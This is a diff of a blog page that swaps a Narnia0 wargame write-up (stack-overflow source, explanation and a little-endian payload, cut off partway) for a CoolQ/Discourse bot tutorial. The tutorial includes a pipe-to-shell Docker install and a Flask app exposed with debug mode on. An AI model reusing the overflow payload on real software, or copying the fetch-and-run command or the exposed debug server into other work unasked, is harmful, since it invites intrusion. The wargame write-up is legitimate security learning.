@@ -12,7 +12,7 @@
     
     <title>
         
-            人生第一道PWN,Overthewire之Narnia0 | 
+            使用酷Q机器人实现Discourse论坛动态推送 | 
         
         AresX&#39;s Blog
     </title>
@@ -40,7 +40,7 @@
     <meta name="theme-color" content="#0097A7">
     <meta name="author" content="AresX">
     <meta name="description" itemprop="description" content="There is no description">
-    <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客,Writeup,PWN,Overthewire">
+    <meta name="keywords" content="AresX&#39;s Blog,AresX,Aresx 博客,Discourse">
 
     <!-- Site Verification -->
     <meta name="google-site-verification" content="rVqEDFDRIznSgfyvSoh7KIxfhwh6uxZtvgO_Vxr-QDs" />
@@ -69,18 +69,18 @@
     <!-- The Open Graph protocol -->
     <meta property="og:url" content="https://ares-x.com">
     <meta property="og:type" content="blog">
-    <meta property="og:title" content="人生第一道PWN,Overthewire之Narnia0 | AresX&#39;s Blog">
+    <meta property="og:title" content="使用酷Q机器人实现Discourse论坛动态推送 | AresX&#39;s Blog">
     <meta property="og:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png" />
     <meta property="og:description" content="There is no description">
-    <meta property="og:article:tag" content="Writeup"> <meta property="og:article:tag" content="PWN"> <meta property="og:article:tag" content="Overthewire"> 
+    <meta property="og:article:tag" content="Discourse"> 
 
     
-        <meta property="article:published_time" content="9月 02, 2017" />
-        <meta property="article:modified_time" content="9月 17, 2017" />
+        <meta property="article:published_time" content="2月 21, 2018" />
+        <meta property="article:modified_time" content="2月 21, 2018" />
     
 
     <!-- The Twitter Card protocol -->
-    <meta name="twitter:title" content="人生第一道PWN,Overthewire之Narnia0 | AresX&#39;s Blog">
+    <meta name="twitter:title" content="使用酷Q机器人实现Discourse论坛动态推送 | AresX&#39;s Blog">
     <meta name="twitter:description" content="There is no description">
     <meta name="twitter:image" content="https://cache-1253916356.file.myqcloud.com/img/favicon.png">
     <meta name="twitter:card" content="summary_large_image" />
@@ -88,7 +88,7 @@
 
     <!-- Add canonical link for SEO -->
     
-        <link rel="canonical" href="https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html" />
+        <link rel="canonical" href="https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html" />
     
 
     <!-- Structured-data for SEO -->
@@ -114,10 +114,10 @@
         },
         "description": "Anarchy is the key"
     },
-    "headline": "人生第一道PWN,Overthewire之Narnia0",
-    "url": "https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html",
-    "datePublished": "9月 02, 2017",
-    "dateModified": "9月 17, 2017",
+    "headline": "使用酷Q机器人实现Discourse论坛动态推送",
+    "url": "https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html",
+    "datePublished": "2月 21, 2018",
+    "dateModified": "2月 21, 2018",
     "description": "There is no description",
     "mainEntityOfPage": {
         "@type": "WebPage",
@@ -351,7 +351,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     
     <ul class="post-toc-wrap mdl-menu mdl-menu--bottom-left mdl-js-menu mdl-js-ripple-effect" for="post-toc-trigger-btn" style="max-height:80vh; overflow-y:scroll;">
-        <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#十分简单的PWN"><span class="post-toc-number">1.</span> <span class="post-toc-text">十分简单的PWN</span></a></li></ol>
+        <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#安装"><span class="post-toc-number">1.</span> <span class="post-toc-text">安装</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#启动"><span class="post-toc-number">2.</span> <span class="post-toc-text">启动</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#安装API"><span class="post-toc-number">3.</span> <span class="post-toc-text">安装API</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#启用api"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">启用api</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#API描述"><span class="post-toc-number">4.</span> <span class="post-toc-text">API描述</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#服务器推送代码"><span class="post-toc-number">5.</span> <span class="post-toc-text">服务器推送代码</span></a></li></ol>
         <!--
         <li class="mdl-menu__item">
             Some Action
@@ -389,7 +389,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
         
     
             <p class="article-headline-p">
-                人生第一道PWN,Overthewire之Narnia0
+                使用酷Q机器人实现Discourse论坛动态推送
             </p>
         </div>
 
@@ -408,7 +408,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
     <!-- Author Name & Date -->
     <div>
         <strong>AresX</strong>
-        <span>9月 02, 2017</span>
+        <span>2月 21, 2018</span>
     </div>
 
     <div class="section-spacer"></div>
@@ -430,7 +430,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-qrcode-button">
     <li class="mdl-menu__item">在其它设备中阅读本文章</li>
     
-        <img src="https://pan.baidu.com/share/qrcode?w=246&h=246&url=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/">
+        <img src="https://pan.baidu.com/share/qrcode?w=246&h=246&url=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/">
     
 </ul>
     
@@ -443,7 +443,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
     </button>
     <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="article-functions-viewtags-button">
         <li class="mdl-menu__item">
-        <a class="post_tag-link" href="/tags/Overthewire/">Overthewire</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/PWN/">PWN</a></li><li class="mdl-menu__item"><a class="post_tag-link" href="/tags/Writeup/">Writeup</a>
+        <a class="post_tag-link" href="/tags/Discourse/">Discourse</a>
     </ul>
     
 
@@ -470,7 +470,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     <!-- Share Weibo -->
     
-        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=人生第一道PWN,Overthewire之Narnia0&url=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html&pic=&searchPic=false&style=simple" target="_blank">
+        <a class="post_share-link" href="http://service.weibo.com/share/share.php?appkey=&title=使用酷Q机器人实现Discourse论坛动态推送&url=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html&pic=&searchPic=false&style=simple" target="_blank">
             <li class="mdl-menu__item">
                 分享到微博
             </li>
@@ -479,7 +479,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     <!-- Share Twitter -->
     
-        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=人生第一道PWN,Overthewire之Narnia0&url=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html&via=AresX" target="_blank">
+        <a class="post_share-link" href="https://twitter.com/intent/tweet?text=使用酷Q机器人实现Discourse论坛动态推送&url=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html&via=AresX" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Twitter
             </li>
@@ -488,7 +488,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     <!-- Share Facebook -->
     
-        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html" target="_blank">
+        <a class="post_share-link" href="https://www.facebook.com/sharer/sharer.php?u=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Facebook
             </li>
@@ -497,7 +497,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     <!-- Share Google+ -->
     
-        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html" target="_blank">
+        <a class="post_share-link" href="https://plus.google.com/share?url=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Google+
             </li>
@@ -506,7 +506,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     <!-- Share LinkedIn -->
     
-        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html&title=人生第一道PWN,Overthewire之Narnia0" target="_blank">
+        <a class="post_share-link" href="https://www.linkedin.com/shareArticle?mini=true&url=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html&title=使用酷Q机器人实现Discourse论坛动态推送" target="_blank">
             <li class="mdl-menu__item">
                 分享到 LinkedIn
             </li>
@@ -515,7 +515,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     <!-- Share QQ -->
     
-        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=人生第一道PWN,Overthewire之Narnia0&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html" target="_blank">
+        <a class="post_share-link" href="http://connect.qq.com/widget/shareqq/index.html?site=AresX&#39;s Blog&title=使用酷Q机器人实现Discourse论坛动态推送&summary=There is no description&pics=https://ares-x.comhttps://cache-1253916356.file.myqcloud.com/img/favicon.png&url=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html" target="_blank">
             <li class="mdl-menu__item">
                 分享到 QQ
             </li>
@@ -524,7 +524,7 @@ document.getElementsByTagName('head')[0].appendChild(script);
 
     <!-- Share Telegram -->
     
-        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2017/09/02/人生第一道PWN,Overthewire之Narnia0/index.html&text=人生第一道PWN,Overthewire之Narnia0" target="_blank">
+        <a class="post_share-link" href="https://telegram.me/share/url?url=https://ares-x.com/2018/02/21/使用酷Q机器人实现Discourse论坛动态推送/index.html&text=使用酷Q机器人实现Discourse论坛动态推送" target="_blank">
             <li class="mdl-menu__item">
                 分享到 Telegram
             </li>
@@ -539,108 +539,139 @@ document.getElementsByTagName('head')[0].appendChild(script);
                 <!-- Post Content -->
                 <div id="post-content" class="mdl-color-text--grey-700 mdl-card__supporting-text fade out">
     
-        <h2 id="十分简单的PWN"><a href="#十分简单的PWN" class="headerlink" title="十分简单的PWN"></a>十分简单的PWN</h2><p><em>第一次做pwn题目，缘由在《THE HACKER PLAYBOOK2》中第一章有提及，并且作者带着做了一遍，觉得很有意思，于是记下了自己做的时候的一些理解</em></p>
-<p>说这道题简单是因为，这道题甚至不需要使用调试器，能看懂c语言，对堆栈有基本理解，熟悉Linux基本指令就能做出来。。。</p>
-<p>*<a href="http://overthewire.org/wargames/narnia/" target="_blank" rel="external">题目网站</a></p>
-<hr>
-<p>首先登录题目服务器</p>
-<pre><code>ssh narnia0@narnia.labs.overthewire.org
-Password:narnia0
-cd
-cd /narnia/
-</code></pre><p><code>ls</code>看到题目文件:<code>narnia0.c</code></p>
-<p>看一下源码</p>
-<pre><code>cat narnia0.c
-</code></pre><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
-<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+        <p>smartqq协议下的bot最麻烦的就是经常要扫二维码。。。<br>换了酷q on Docker</p>
+<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><p>安装docker</p>
+<pre><code>wget -qO- https://get.docker.io/ | sh
+</code></pre><p>pull 酷q</p>
+<pre><code>docker pull coolq/wine-coolq
+</code></pre><p>在任意目录创建一个空文件夹，用于持久化存放 酷Q 数据</p>
+<pre><code>mkdir /root/coolq-data # 任意路径均可
+</code></pre><h1 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h1><p>先执行一次</p>
+<pre><code>docker run --name=coolq --rm -p 8080:9000 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=10000 coolq/wine-coolq
+</code></pre><p>当你看到 [CQDaemon] Started CoolQ . 时，说明已启动成功。</p>
+<table>
+<thead>
+<tr>
+<th>参数含义</th>
+<th>参数示例</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>远程监听端口</td>
+<td>8080</td>
+</tr>
+<tr>
+<td>数据存放位置</td>
+<td>/root/coolq-data</td>
+</tr>
+<tr>
+<td>远程访问密码</td>
+<td>12345678</td>
+</tr>
+<tr>
+<td>机器人 QQ 帐号</td>
+<td>10000</td>
+</tr>
+</tbody>
+</table>
+<h1 id="安装API"><a href="#安装API" class="headerlink" title="安装API"></a>安装API</h1><p>终止进程，<code>cd /root/coolq-data/app</code></p>
+<pre><code>wget https://github.com/richardchien/coolq-http-api/releases/download/v3.4.0/io.github.richardchien.coolqhttpapi.cpk
+</code></pre><h2 id="启用api"><a href="#启用api" class="headerlink" title="启用api"></a>启用api</h2><p>再次启动:</p>
+<pre><code>docker run --name=coolq --rm -p 8080:9000 -p 127.0.0.1:5700:5700 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=10000 coolq/wine-coolq
+</code></pre><p><em>为了避免别有用心的大佬调戏机器人发送奇怪的东西，建议将外部5700只监听本地ip</em></p>
+<p>访问 <a href="http://ip:8080" target="_blank" rel="external">http://ip:8080</a> 连接vnc 密码看上面参数含义中的介绍</p>
+<p>然后右键悬浮窗启用HTTP API插件</p>
+<p><img src="https://parrotsec-china.org/uploads/default/original/1X/363a468c4ba753012545c43b7a05e7123ca89e03.png" alt="~5E293x206"></p>
+<p><img src="https://parrotsec-china.org/uploads/default/original/1X/700bda8f3ffe1c3cd8eb113f8c4705cdf51e5eda.png" alt="F{N67`GQFFWJ{O6U2K478VB|610x444"></p>
+<p><strong>后台运行</strong></p>
+<p>把上面代码中的 <code>--rm</code> 改成 <code>-d</code>就行</p>
+<pre><code>docker run --name=coolq -d -p 8080:9000 -p 127.0.0.1:5700:5700 -v /root/coolq-data:/home/user/coolq -e VNC_PASSWD=12345678 -e COOLQ_ACCOUNT=10000 coolq/wine-coolq
+</code></pre><h1 id="API描述"><a href="#API描述" class="headerlink" title="API描述"></a>API描述</h1><p>参考文档:<a href="https://richardchien.github.io/coolq-http-api/3.4/#/API" target="_blank" rel="external">https://richardchien.github.io/coolq-http-api/3.4/#/API</a></p>
+<h1 id="服务器推送代码"><a href="#服务器推送代码" class="headerlink" title="服务器推送代码"></a>服务器推送代码</h1><p><strong>需要配置webhook,参考</strong><a href="https://parrotsec-china.org/t/topic/898" target="_blank" rel="external">https://parrotsec-china.org/t/topic/898</a></p>
+<p>没什么太大的变化</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request<span class="token punctuation">,</span>Response
+<span class="token keyword">import</span> json<span class="token punctuation">,</span>urllib<span class="token punctuation">,</span>requests
 
-<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
-    <span class="token keyword">long</span> val<span class="token operator">=</span><span class="token number">0x41414141</span><span class="token punctuation">;</span>
-    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Correct val's value from 0x41414141 -> 0xdeadbeef!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Here is your chance: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%24s"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
+headers <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">}</span>
+url<span class="token operator">=</span><span class="token string">'http://127.0.0.1:5700/send_group_msg'</span>
+group<span class="token operator">=</span><span class="token number">1234567</span>
 
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf: %s\n"</span><span class="token punctuation">,</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"val: 0x%08x\n"</span><span class="token punctuation">,</span>val<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'message'</span><span class="token punctuation">:</span>msg<span class="token punctuation">,</span><span class="token string">'group_id'</span><span class="token punctuation">:</span> group<span class="token punctuation">}</span>
+    rsg<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">,</span>data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text
+    <span class="token keyword">print</span> <span class="token punctuation">(</span>rsg<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> rsg
 
-    <span class="token keyword">if</span><span class="token punctuation">(</span>val<span class="token operator">==</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span>
-        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"WAY OFF!!!!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
+<span class="token comment" spellcheck="true">#n = bot.List('group','NotFound')[0]</span>
 
-    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> <span class="token string">'hello world'</span>
+
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/json'</span><span class="token punctuation">,</span>methods <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">my_json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    headers <span class="token operator">=</span> request<span class="token punctuation">.</span>headers
+    event <span class="token operator">=</span> <span class="token punctuation">(</span>headers<span class="token punctuation">[</span><span class="token string">'X-Discourse-Event'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    content <span class="token operator">=</span> request<span class="token punctuation">.</span>json
+    res<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'msg'</span><span class="token punctuation">:</span>handle<span class="token punctuation">(</span>event<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">}</span>
+    <span class="token keyword">return</span> Response<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">,</span>mimetype<span class="token operator">=</span><span class="token string">'application/json'</span><span class="token punctuation">)</span>
+
+
+
+<span class="token keyword">def</span> <span class="token function">new_topic</span><span class="token punctuation">(</span>topic<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content <span class="token operator">=</span> topic
+    topicName <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'topic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    topicSlug <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'topic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'slug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    topicId <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'topic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    userName <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'topic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'details'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'created_by'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    url <span class="token operator">=</span> <span class="token string">'https://parrotsec-china.org/t/'</span> <span class="token operator">+</span> topicSlug <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> topicId
+    msg<span class="token operator">=</span><span class="token string">'%s 发表了新主题: "%s" \n %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>userName<span class="token punctuation">,</span>topicName<span class="token punctuation">,</span>url<span class="token punctuation">)</span>
+    <span class="token keyword">print</span> <span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> send<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">new_post</span><span class="token punctuation">(</span>post<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    content <span class="token operator">=</span> post
+    name <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    title <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'topic_title'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    topicSlug <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'topic_slug'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    topicId <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'topic_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    postNumber <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'post_number'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    url <span class="token operator">=</span> <span class="token string">'https://parrotsec-china.org/t/'</span> <span class="token operator">+</span> topicSlug <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> topicId <span class="token operator">+</span> <span class="token string">'/'</span> <span class="token operator">+</span> postNumber
+    <span class="token keyword">if</span> <span class="token string">'reply_to_user'</span> <span class="token keyword">in</span> content<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        postTo <span class="token operator">=</span> str<span class="token punctuation">(</span>content<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'reply_to_user'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        msg<span class="token operator">=</span><span class="token string">'%s 在主题 "%s" 中回复了 %s \n %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>title<span class="token punctuation">,</span>postTo<span class="token punctuation">,</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> send<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        msg<span class="token operator">=</span><span class="token string">'%s 在主题 "%s" 中发表了回复 \n %s'</span><span class="token operator">%</span> <span class="token punctuation">(</span>name<span class="token punctuation">,</span>title<span class="token punctuation">,</span>url<span class="token punctuation">)</span>
+        <span class="token keyword">return</span> send<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>
+
+
+
+<span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>event<span class="token punctuation">,</span>myjson<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> event <span class="token operator">==</span> <span class="token string">'topic_created'</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> myjson<span class="token punctuation">[</span><span class="token string">'topic'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> new_topic<span class="token punctuation">(</span>myjson<span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> event <span class="token operator">==</span> <span class="token string">'post_created'</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> myjson<span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'post_number'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">return</span> new_post<span class="token punctuation">(</span>myjson<span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        <span class="token keyword">pass</span>
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host <span class="token operator">=</span> <span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port <span class="token operator">=</span> <span class="token number">8000</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
 </code></pre>
-<p>读一遍代码，是一个十分简单的C语言程序：</p>
-<pre><code>首先对变量val进行赋值，然后申请了一个20字节的字符数组buf
-
-之后输出题目要求，获取用户对数组buf的输入
-
-用户输入后输出用户的输入和val的16进制值
-
-如果val的值与特定的数值匹配，则调用`/bin/sh`
-
-不匹配则输出失败信息
-</code></pre><p>首先,题目要求是把val的值从<code>0x41414141</code>改变成<code>0xdeadbeef</code></p>
-<p>但是程序并没有提供修改<code>val</code>变量的可写入函数</p>
-<p>浏览代码，发现第五行变量<code>val</code>被赋值为:<code>0x41414141</code></p>
-<p>查看Ascii码表，算出对应字符串为:<code>AAAA</code><br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1504366763690&amp;di=6687ad195002154e5e4ac340ca4d9872&amp;imgtype=0&amp;src=http%3A%2F%2Fs2.sinaimg.cn%2Fmiddle%2F56d8ea90tac5177d3a0d1%26690" alt="Ascii码表"></p>
-<p>在第6行<code>char buf[20]</code>说明程序接受输入的缓冲区长度为20字节</p>
-<p>而在第10行<code>scanf()</code>函数允许最多输入长度为24字节，于是造成了缓冲区溢出，溢出的这4个字节就是达成目的的关键</p>
-<p>测试一下输入24个字节后溢出的四个字节会造成什么样的后果</p>
-<p>运行程序:</p>
-<pre><code>narnia0@narnia:/narnia$ ./narnia0        
-Correct val&#39;s value from 0x41414141 -&gt; 0xdeadbeef!
-Here is your chance:
-</code></pre><p>在这里程序在等待用户输入，也就是执行到了<code>scanf(&quot;%24s&quot;,&amp;buf)</code>函数</p>
-<p>输入20个A 加上<code>BCDE</code>来测试</p>
-<pre><code>Here is your chance: AAAAAAAAAAAAAAAAAAAABCDE
-buf: AAAAAAAAAAAAAAAAAAAABCDE
-val: 0x45444342
-WAY OFF!!!!
-</code></pre><p>输出了<code>val: 0x45444342</code> 而对应的ascii即是<code>EDCB</code>,这说明可以修改内存中<code>val</code>的值！溢出的四个字节覆盖到了<code>val</code>上</p>
-<p>注意这里的顺序,输入的最后是<code>BCDE</code>,但显示的顺序是<code>EDCB</code></p>
-<p><strong>因为栈机制是先进后出/后进先出,及如果依次入栈为1234,依次出栈的顺序就是4321,这点十分重要</strong></p>
-<p>现在要做的就算把<code>val</code>的值变成<code>0xdeadbeef</code></p>
-<p>注意<code>0xdeadbeef</code>并不是一串字符串，而是一个16进制数,8位的16进制数占4个字节</p>
-<p>所以在输入的时候顺序要为:<code>\xef\xbe\xad\xde</code> 及<code>A*20+\xef\xbe\xad\xde</code></p>
-<p>如何获得这串16进制数<code>\xef\xbe\xad\xde</code>对应的字符串呢？</p>
-<p>在Python中，可以使用<code>\x</code>对字符串进行转义，把输入的字符串当成16进制输出对应的字符</p>
-<p>如:</p>
-<pre><code>&gt;&gt;&gt; print &quot;\x41&quot;
-&gt;&gt;&gt; A
